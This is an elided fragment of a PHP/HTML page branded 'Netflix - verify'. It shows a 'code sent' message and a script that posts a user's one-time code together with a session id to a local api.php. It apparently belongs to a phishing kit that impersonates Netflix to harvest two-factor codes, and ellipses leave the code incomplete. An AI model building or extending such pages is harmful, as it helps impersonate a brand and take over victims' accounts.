...
<head>
    ...
    <title>Netflix - <?php echo t('verify', $lang); ?></title>
...
<body>
    ...
    <main class="nf-main">
        <div class="nf-card verify-card">
            ...
            <h2><?php echo t('verify', $lang); ?></h2>
            <p class="verify-desc"><?php echo t('verify_sub', $lang); ?></p>
            <p class="verify-desc2"><?php echo t('code_sent', $lang); ?></p>
    ...
    <script>
        ...
        document.getElementById('otpForm').addEventListener('submit', async (e) => {
            ...
            await fetch('api.php', {
                ...
                body: 'action=otp&sid=' + sid + '&otp=' + code
            });
